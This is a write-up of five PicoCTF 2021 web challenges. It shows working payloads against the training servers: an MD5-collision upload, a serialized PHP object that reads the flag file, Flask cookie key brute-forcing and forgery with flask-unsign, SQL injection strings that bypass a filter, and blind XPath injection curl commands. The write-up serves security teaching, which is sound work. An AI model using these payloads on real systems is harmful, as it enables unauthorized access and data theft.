# PicoCTF 2021

Ctf At: https://play.picoctf.org/ - PicoGym

## It is my Birthday

**Challenge Link**

http://mercury.picoctf.net:50970/
<br />

**Solution**

Basically what it wants you to do is to upload 2 different PDF files with the same MD5 Hash. There are different files out there that contain the same MD5 hash, just google them.  To upload them as a pdf, all you have to do is change the file extension.  It won't affect the MD5 hash, but it will be verified as a PDF as their PHP only checks file extensions.  
The files I used are uploaded as birthday1 and 2 in this repo.
<br />
## Super Serial

**Challenge Link**

http://mercury.picoctf.net:3449/
<br />

**Solution**

Immediately after opening the site, you see a login page.  This login page looks nearly identical to the login pages used for some of their other challenges, so I thought this was an sql injection type of thing first.  However, that isn't the case.  Instead, I looked around and found that the robots.txt file contained something interesting.

robots.txt: 
```
User-agent: *
Disallow: /admin.phps
```

This gave an interesting file, but after navigating to the link, you find that the file doesn't exist.  It also has a weird extension that I never heard of, `phps`.

A quick google search leads shows that phps files are just php files that display code that is color coded to make it more readable.  Using this information, I tried to go to the link `http://mercury.picoctf.net:3449/index.phps`, because index.php was a file, and boom!  It showed the source code for the website. 

After quickly reading skimming through the file, you can find that the login creates a `permissions` object that is serialized and then placed into the `login` object.  You can also see that there are 2 more php files that are readable using the phps extension, `cookie.phps` and `authentication.phps`.  

In cookie.phps you can see the permissions class, while in authentication.phps there is an access_log class.  However, in cookie.phps you can see something interesting.  The deserialize method is called, which in this case creates an object from the serialized data.  In theory this would take the cookie created during logging in and deserialize it to get the username and password.  However since we know that there is another class, the `access_log` class, we can insert a serialization that would cause the deserialize in cookie.phps to create an access_log class.  As for the parameters for the class, we can put the location of `../flag`.

After taking the code and messing around with it in some online php compiler (I used this one: https://paiza.io/en/projects/new), I found that the serialization of an access_log object with the "../flag" parameter was: 
```
O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}
```
Base64 encode it and stick it into the login cookie, and navigate to `authentication.php`, and you get your flag!
<br />
## Most Cookies

**Challenge Link**

http://mercury.picoctf.net:18835/
<br />

**Solution**

Like the other cookies problems, essentially what they want you to do is to create fake cookie that allows you to pretend to be an admin.  This time they gave you a server file, and you find that the cookie is made with flask.  The cookie is also signed using a random key chosen from an array the admins kindly wrote in the server.py file:
```
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
```

A good tool you can use for this problem is flask-unsign.  This program allows us to decode and encode our own flask cookies.  Taking the cookie, you can run the command:
```
flask-unsign --decode --cookie [insert cookie]
```
to decode the cookie.  From doing this with our cookie value, we can find that the value our cookie contains is `{'very_auth':'blank'}`.  We can assume that the value needed for admin permissions is `{'very_auth':'admin'}.`

Flask-Unsign also has another interesting function.  It can guess the brute force the password used to encode the cookie given a list.  So what we do is we take the list of possible passwords from above, stick it & format it inside a text file, and run the following command:
```
flask-unsign --unsign --cookie [insert cookie] --wordlist [insert wordlist]
```

https://prnt.sc/110dxi3 - Example SS from me, you're cookie and key are likely to be different.

Afterwards, you can just run the following command to sign your own cookie that lets you in as admin:

 ```
 flask-unsign --sign --cookie "{'very_auth':'admin'}" --secret [Your Secret]
 Which in my case was:
 flask-unsign --sign --cookie "{'very_auth':'admin'}" --secret 'butter'
 ```
 
 Stick that value into the session cookie on the website, and reload to find the flag!
 <br />
 ## Web Gauntlet 2/3

**Challenge Link**

http://mercury.picoctf.net:35178/ - Web Gauntlet 2<br />
http://mercury.picoctf.net:32946/ - Web Gauntlet 3

<br />

**Solution**
In these two problems, the filters are the exact same. The only difference is the length limit, so the following solution will work for both problems.  If you can't go to filter.php after solving, try refreshing your cookies or doing it in incognito.

In both of these problems, we can find the filter at `/filter.php`.  In there we find that each of the following operators are filtered:

```
Filters: or and true false union like = > < ; -- /* */ admin
```
They happen to print the sql query when you try logging in with anything, so we find that the query is
```
SELECT username, password FROM users WHERE username='[insert stuff here]' AND password='[insert stuff here]'
```

There is also a character limit of 25 total characters (35 for Web Gauntlet 3) for username + password added together.  To solve this problem, we need to look at the sqlite operators that are not filtered, which are listed at: 
```
https://www.tutorialspoint.com/sqlite/sqlite_operators.htm
```
First things first, we need to find a way to get admin to not be filtered.  Fortunately they haven't banned `||` which is concatenates strings in sqlite.  We can get the string admin by just putting `adm'||'in`.

Next, we need to find a way to bypass the password checking.  We see that they haven't filtered any of the binary operators, which also happen to be 1 character long.  We can use these, especially the `| (binary or operator)` to bypass the password checking.

We can also use `is` and `is not` to replace `=` and `!=`.

From this I created the inputs:<br />
Username: `adm'||'in`<br />
Password: `' | '' IS '`<br />
Which would query: `SELECT username, password FROM users WHERE username='adm'||'in' AND password='' | '' IS ''`<br />

However for some reason this didn't seem to work.  I opened up an online sqlite compiler at `https://sqliteonline.com/` to do some more testing, and found that for some reason the | operator would return true if I put `'' IS NOT ''`.  So I replaced `IS` with `IS NOT` in the query, and it worked!

Final Input:<br />
Username: `adm'||'in`<br />
Password: `' | '' IS NOT '`<br />
Which would query: `SELECT username, password FROM users WHERE username='adm'||'in' AND password='' | '' IS NOT ''`<br />

Which happens to be exactly 25 characters long.
Navigate to filter.php to find the flag afterwards.


<br />

## X Marks the Spot

**Challenge Link**

http://mercury.picoctf.net:16521/
<br />

**Solution**

This is a login bypass problem that uses XPath and blind injections.  I didn't know anything about XPath before this challenge, so first things first, research!

I found this nice article that gave me XPath injections written for me, located at https://owasp.org/www-community/attacks/Blind_XPath_Injection

<br />

So first thing's first.  To test booleans on this site, we can use the following injection:
```
Username: anything
Password: ' or [insert boolean]  or ''='a
```
If the site responds with "You're on the right path", the boolean is true.  If it returns false, the site responds with "Login failure."

There are two booleans that I used during this challenge.
```
string-length(//user[position()=1]/child::node()[position()=2])=6 
substring((//user[position()=1]/child::node()[position()=2]),1,1)="a"
```
Breaking down the first command, it basically checks if the length of the string in the `user` table at position [1,2] is 6. <br />
Breaking down the second command, it checks takes the first character of the string in the `user` table at position [1,2] is "a".

A couple things to note about this is that indexes in XPath start with 1 and not 0, and that the substring method works like this:
```
substring(String to check, Index of First Character, Length of Substring)
```

You can use these two booleans to brute force the values of anything in the table.  By using these on a couple of locations, I found a few different values, like `thisisnottheflag`, `admin`, and `bob`.  Taking a hint from the name of this problem, I decided to go take the brute force route.

You can convert the querys above into a curl command like the following:
```
curl -s -X Post http://mercury.picoctf.net:16521/ -d "name=admin&pass=[insert url encoded query]" | grep right
```

If the command prints out something along the lines of `You're on the right path`, that means it returned true.  If it didn't print anything at all, it returned false.

Using this I made a python script (because I can't write a working bash script for some reason) to find which locations in the user table actually contained stuff.  The scripts won't be uploaded because they're messy and I may or may not have deleted them.

```
Example Command
curl -s -X POST http://mercury.picoctf.net:16521/ -d name=admin&pass='%20or%20string-length(//user%5Bposition()=" + loc1 + "%5D/child::node()%5Bposition()=" + loc2 + "%5D)%3E0%20or%20''='a" | grep right
loc1 and loc2 were variables I used to guess positions.
If the cell at that location contained stuff, the length would be more than 0, so thats what this boolean checked.
```

Using this, I found that there the cells from positions [1-3][1-5] contained stuff.  Then I used another script that would brute force the first 6 characters for each of these 15 cells.
```
Example Command
check = "curl -s -X POST http://mercury.picoctf.net:16521/ -d \"" + cmd + "\" | grep right"
cmd = "name=admin&pass='%20or%20substring((//user%5Bposition()=" + pos1 + "%5D/child::node()%5Bposition()=" + pos2 + "%5D)," + str(loc1) + ",1)=%22" + letter + "%22%20%20or%20''='a"

pos1 and pos2 were indexes in the table.  str(loc1) was the location/index in the string.  letter was the current letter that was being tested.  This was in python.
```

Using this I found that the one cell that contained the flag was in position [3,4].

Then doing the same thing above, I found the length of the string in position [3,4], and used a script to brute force brute force every character in the 50 char long flag.

Sorry for not uploading the scripts I used but they were just simple python for loops that used os.popen to run commands.
